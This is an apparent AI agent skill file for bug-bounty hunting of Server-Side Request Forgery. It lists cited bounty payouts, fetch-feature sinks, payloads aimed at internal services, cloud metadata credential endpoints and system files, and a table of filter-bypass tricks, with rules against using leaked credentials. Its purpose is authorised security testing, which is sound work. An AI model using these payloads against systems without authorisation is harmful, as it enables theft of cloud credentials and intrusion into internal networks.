---
name: bb-ssrf
description: Hunt Server-Side Request Forgery — URL-fetching features (webhooks, import/export, URL previews, avatar-by-URL, PDF generators, import-from-URL pipelines), internal port scanning, cloud metadata theft, and full-read escalation. Use whenever the user mentions SSRF, fetch-url/webhook/avatar/preview endpoints, internal network access, 169.254.169.254 or cloud metadata, or wants to test a feature that makes the server fetch a URL.
---

# SSRF Hunter

SSRF = the server fetches a URL you control. Find the fetch features, point them inward, prove internal reachability. 208 paid records in the corpus; the ladder from pingback ($0) to full-read import ($5k–$10k) is consistent.

## Real-bug anchors (what actually paid — query bb-disclosures for more)
- **$10,000** SSRF on **project import** via `remote_attachment_url` on a Note — import features fetch URLs with service privileges.
- **$6,000** **Blind** SSRF to internal services in a matrix `preview_link` API — blind still pays when internal reachability is proven.
- **$5,000** **Half-blind SSRF in kube cloud-controller-manager** upgraded to complete impact — infrastructure components count.
- **$5,000** **Full read SSRF via Lark Docs "import as docs"** — when the fetched content comes back rendered, that's the ceiling.
Delta lesson: **import-from-URL** is the pattern to hunt first; **full-read** (response body returned) is worth double blind; DNS-pingback alone is worth nothing.

## Sink hunting (from JS + UI)
Params/features named: `url`, `image_url`, `callback`, `webhook`, `import`, `fetch`, `preview`, `render`, `avatar url`, "connect your site", "generate PDF from page", "import from URL", link-preview in chat/comment systems, SSO/OAuth `redirect` fetch, RSS/feed importers, site-verification by URL, attachment-by-remote-URL (`remote_attachment_url`-style).

## Payload ladder (escalate in order)
1. **External confirm** (OOB): your own listener/collaborator URL proves server-side fetch. DNS-only hit = weak — most programs reject pingback-alone.
2. **Internal services** (blind via response behavior or error text):
   `http://127.0.0.1:6379/` (Redis), `:9200/` (Elasticsearch), `:27017/` (Mongo), `:8080/:8443` (internal apps), `http://localhost/`, `http://[::1]/`
3. **Cloud metadata** (the money):
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (then IMDSv2 token flow if v1 blocked)
   - GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (needs `Metadata-Flavor: Google` header — often the blocker)
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (`Metadata: true`)
4. **File scheme**: `file:///etc/passwd`, `file:///proc/self/environ` (works in some fetchers).

## Filter bypass table
| Filter blocks | Try |
|---|---|
| `127.0.0.1` string | `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://0177.0.0.1/` (octal), `http://127.1/`, `http://[::1]/` |
| Private ranges | domain resolving to 127.0.0.1 (rebinding), `localtest.me`, `nip.io` variants `127.0.0.1.nip.io` |
| http only | `dict://`, `gopher://` (gopher can speak SMTP/Redis — high impact, careful) |
| Redirect checks | allowed-URL → 302 → internal target |
| URL parser confusion | `http://allowed.com#@internal/`, `http://internal/@allowed.com`, backslash tricks |

## Rules of engagement
- If the fetch result is returned to you (inline preview, PDF content, imported doc) — internal HTML/error pages in the response = full impact evidence.
- Blind SSRF: escalate to a distinguishing internal probe (open port vs closed changes response TIME/error) before claiming; plain DNS pingback is usually rejected as low/informative.
- Never actually exfiltrate cloud credentials you find in metadata — capture proof (redacted), stop, report. Do not use leaked IAM tokens.
- Gopher/SMTP internal actions: prove the protocol responds, don't send emails.

## Evidence format
The request that triggers the fetch + the response proving server-side perspective (internal body, port-scan timing delta, or metadata echo with secrets redacted) + impact statement (which cloud/network segment became reachable). Calibrate against `query.py --class SSRF --min-bounty 2000`.
